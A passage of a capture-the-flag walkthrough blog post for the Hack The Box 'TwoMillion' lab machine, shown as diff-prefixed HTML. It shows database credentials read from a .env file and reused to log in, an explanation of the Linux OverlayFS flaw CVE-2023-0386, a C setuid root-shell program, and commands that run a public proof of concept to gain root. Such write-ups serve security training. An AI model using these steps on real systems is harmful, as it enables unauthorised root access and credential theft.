+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1237</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> Database.php
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2787</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> Router.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 15:20 VPN
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> assets
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> controllers
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> css
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> fonts
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> images
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2692</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> index.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> js
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> views
+</span></span></code></pre></div><p><strong>Environment Variables:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@2million:~/html$ cat .env
+</span></span><span style="display:flex;"><span>DB_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>DB_DATABASE<span style="color:#f92672">=</span>htb_prod
+</span></span><span style="display:flex;"><span>DB_USERNAME<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>DB_PASSWORD<span style="color:#f92672">=</span>SuperDuperPass123
+</span></span></code></pre></div><p>We have the env variable file which contains the username and password. Let&rsquo;s try to open the <code>/etc/passwd</code> file and see if does admin user exists in the system or not. It looks like the admin user does exist on the system.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118210314.png" alt=""></p>
+<h3 id="shell-as-admin-1">Shell as admin</h3>
+<p>We can log in as admin users who read the user flag.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118210503.png" alt=""></p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118210516.png" alt=""></p>
+<p>Now, Let&rsquo;s jump for root flag 🚩</p>
+<h2 id="shell-as-root">Shell as root</h2>
+<p>From the hint, we get to know that the admin user has to do something with the mail system on Linux. We got the admin file under the mail directory which contains the mail from <strong>ch4p</strong> regarding the Patching System OS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>From: ch4p &lt;ch4p@2million.htb&gt;
+</span></span><span style="display:flex;"><span>To: admin &lt;admin@2million.htb&gt;
+</span></span><span style="display:flex;"><span>Cc: g0blin &lt;g0blin@2million.htb&gt;
+</span></span><span style="display:flex;"><span>Subject: Urgent: Patch System OS
+</span></span><span style="display:flex;"><span>Date: Tue, <span style="color:#ae81ff">1</span> June <span style="color:#ae81ff">2023</span> 10:45:22 -0700
+</span></span><span style="display:flex;"><span>Message-ID: &lt;9876543210@2million.htb&gt;
+</span></span><span style="display:flex;"><span>X-Mailer: ThunderMail Pro 5.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hey admin,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I<span style="color:#e6db74">&#39;m know you&#39;</span>re working as fast as you can to <span style="color:#66d9ef">do</span> the DB migration. While we<span style="color:#e6db74">&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;</span>t get popped by that.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTB Godfather
+</span></span></code></pre></div><h3 id="failed-attempt">Failed Attempt</h3>
+<p>We searched OverlayFS CVE and came across this article by <a href="https://projectdiscovery.io/blog/gameover-lay-local-privilege-escalation-in-ubuntu-kernel">ProjectDiscovery</a>.</p>
+<p>We got the access as the root user but still, it&rsquo;s not a complete root permission.</p>
+<h3 id="cve-2023-0386-analysis">CVE-2023-0386 Analysis</h3>
+<p>I started searching again and it&rsquo;s observed that the machine is vulnerable to CVE-2023-0386.</p>
+<pre tabindex="0"><code class="language-ad-summary" data-lang="ad-summary">CVE-2023-0386 is a high-severity vulnerability in the Linux kernel&#39;s overlayfs filesystem. Improper permission handling allows local attackers to easily escalate privileges to root, compromising the entire system.
+</code></pre><h4 id="how-to-detect">How to Detect?</h4>
+<p>The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the command <code>uname -r</code></p>
+<p>A system is likely to be vulnerable if it has a kernel version lower than 6.2. We found that our Linux machine is running on 5.15</p>
+<pre tabindex="0"><code>admin@2million:~$ uname -r
+5.15.70-051570-generic
+</code></pre><p>Let&rsquo;s understand what is SUID, OverlayFS…</p>
+<h4 id="what-is-suid-bit">What is SUID bit?</h4>
+<p>SUID, short for Set User ID, is <strong>a special permission that can be assigned to executable files</strong>. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file&rsquo;s owner.</p>
+<h4 id="what-is-overlayfs">What is OverlayFS?</h4>
+<p>Overlay filesystems, also known as “union filesystems” or “union mounts” let you mount a filesystem using 2 directories: a “lower” directory, and an “upper” directory.</p>
+<h5 id="1-structure">1. Structure</h5>
+<p>OverlayFS uses three main components:</p>
+<ul>
+<li><strong>Lower directory</strong>: Read-only base layer containing the original files.</li>
+<li><strong>Upper directory</strong>: Writable layer where changes are made.</li>
+<li><strong>Merged view</strong>: The combined result of the lower and upper directories.</li>
+</ul>
+<h5 id="2-file-operations">2. File Operations</h5>
+<ul>
+<li><strong>Read</strong>:
+<ul>
+<li>If a file exists in both layers, the version in the upper layer is presented.</li>
+<li>If a file exists only in the lower layer, it is accessed from there.</li>
+</ul>
+</li>
+<li><strong>Write</strong>:
+<ul>
+<li>If a file in the lower layer is modified, it is copied to the upper layer first (<strong>copy-on-write</strong>), and then the changes are applied to the copy.</li>
+</ul>
+</li>
+<li><strong>Delete</strong>:
+<ul>
+<li>When a file in the lower layer is deleted, it is &ldquo;hidden&rdquo; by creating a <strong>whiteout marker</strong> in the upper layer.</li>
+</ul>
+</li>
+</ul>
+<h5 id="3-mounting-example">3. Mounting Example</h5>
+<p>Assume you have:</p>
+<ul>
+<li>Lower layer: <code>/lower</code></li>
+<li>Upper layer: <code>/upper</code></li>
+<li>Mount point: <code>/merged</code></li>
+</ul>
+<p>Command to create an overlay:</p>
+<pre tabindex="0"><code>mount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged
+</code></pre><h4 id="how-does-the-cve-2023-0386-works">How does the CVE-2023-0386 Works?</h4>
+<ol>
+<li>
+<p><strong>Pretending to Have a Root-Owned File</strong>:</p>
+<ul>
+<li>The attacker uses a trick called <strong>FUSE</strong> (a tool for making fake filesystems) to create a &ldquo;fake&rdquo; file that looks like:
+<ul>
+<li>It&rsquo;s owned by the system administrator (<strong>root</strong>).</li>
+<li>It has the <strong>SUID</strong> bit set, which means running this file will give whoever runs it admin-level privileges.</li>
+</ul>
+</li>
+</ul>
+<p>Normally, creating such a file directly on the system isn’t allowed unless you&rsquo;re already an admin. But with FUSE, you can fake it.</p>
+</li>
+<li>
+<p><strong>Create a Safe &ldquo;Sandbox&rdquo; Environment</strong>:</p>
+<ul>
+<li>The attacker uses something called <strong>user namespaces</strong> to create a sandbox environment.</li>
+<li>This lets them temporarily do things (like mounting filesystems) that normally require admin permissions.</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Up the OverlayFS Trick</strong>:</p>
+<ul>
+<li>The attacker sets up an <strong>OverlayFS</strong> filesystem:
+<ul>
+<li>The <strong>lower directory</strong> (base layer) is the fake filesystem they made with FUSE.</li>
+<li>The <strong>upper directory</strong> (writable layer) is something like <code>/tmp</code>, where anyone can write files.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Trigger the Kernel Bug</strong>:</p>
+<ul>
+<li>The attacker &ldquo;copies&rdquo; the fake file (from the lower layer) to the writable layer (upper directory).</li>
+<li>When the kernel handles this copy, it <strong>believes the fake file’s permissions</strong> and creates a <strong>real file in <code>/tmp</code></strong> that:
+<ul>
+<li>Is owned by root.</li>
+<li>Has the SUID bit set.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Escape the Sandbox and Exploit the File</strong>:</p>
+<ul>
+<li>The attacker exits the sandbox and now has a <strong>real root-owned SUID file</strong> in <code>/tmp</code>.</li>
+<li>They execute this file to become <strong>root</strong> and take full control of the system.</li>
+</ul>
+</li>
+</ol>
+<h4 id="code-example">Code Example</h4>
+<p>Here is the code example which I took from the <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">Datadog</a> article.</p>
+<p>The code written in C will try to set setuid and setgid to root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> result;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;could not setuid(0): %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strerror</span>(errno));
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;could not setguid(0): %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strerror</span>(errno));
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Starting root shell...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Since, to set the uid or gid to root, User requires the root permission. As per expectations, We can see the <strong>Operation not permitted</strong> error from the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john@machine:~$ gcc -Wall setuid.c -o setuid
+</span></span><span style="display:flex;"><span>john@machine:~$ chmod +x setuid
+</span></span><span style="display:flex;"><span>john@machine:~$ ./setuid
+</span></span><span style="display:flex;"><span>could not setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>: Operation not permitted
+</span></span></code></pre></div><p>Here, User has changed the file&rsquo;s user and group ownership to root and also assigned the SUID to the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@machine:/home/john$ chown root:root setuid
+</span></span><span style="display:flex;"><span>root@machine:/home/john$ chmod +s setuid
+</span></span></code></pre></div><p>Here, Lower privilege user John executed the file and since setuid file contains the SUID permission, at the end of file execution John was able to get the Root Shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john@machine:~$ ./setuid
+</span></span><span style="display:flex;"><span>Starting root shell...
+</span></span><span style="display:flex;"><span>root@machine:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="geting-root-flag">Geting Root Flag</h3>
+<p>I was using the POC for CVE-2023-0398 created by <a href="https://github.com/xkaneiki">xkaneiki</a>which is already available on <a href="https://github.com/xkaneiki/CVE-2023-0386">Github</a>.</p>
+<p><strong>Commands:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>make all
+</span></span></code></pre></div><p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118214402.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>fuse .<span style="color:#f92672">/</span>ovlcap<span style="color:#f92672">/</span>lower .<span style="color:#f92672">/</span>gc <span style="color:#f92672">&amp;</span>
+</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>exp
+</span></span></code></pre></div><p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118214424.png" alt=""></p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118214442.png" alt=""></p>
+<p>We have the root flag.</p>
+<p>We also have thank you message from HTB team. Let&rsquo;s try to read the message.</p>
+<h3 id="thank-you-message-from-htb-team">Thank You Message from HTB Team</h3>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250119204826.png" alt=""></p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250119205017.png" alt=""></p>
+<h4 id="final-thank-you-message">Final Thank You Message</h4>
+<pre tabindex="0"><code>Dear HackTheBox Community,
+
+We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.
+
+From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
+
+To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
+
+Here&#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
+
+With deepest gratitude,
+
+The HackTheBox Team
+</code></pre><h2 id="references">References</h2>
+<ul>
+<li><a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a></li>
+<li><a href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></li>
+<li><a href="https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html#br">https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html#br</a></li>
+<li><a href="https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/+">https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/+</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/cve-2023-0386/">CVE-2023-0386</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/overlayfs-exploit/">OverlayFS Exploit</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/linux-exploitation/">Linux Exploitation</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/cve-exploitation/">CVE Exploitation</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/categories/hack-the-box/">Hack The Box</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/categories/walkthrough/">Walkthrough</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/categories/htb/">HTB</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="https://bhavik-kanejiya.github.io/">Bhavik Kanejiya</a></span>
+            
+            <span><a href="https://bhavik-kanejiya.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://bhavik-kanejiya.github.io/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>
+
+
+
+
+    </body>
+</html>
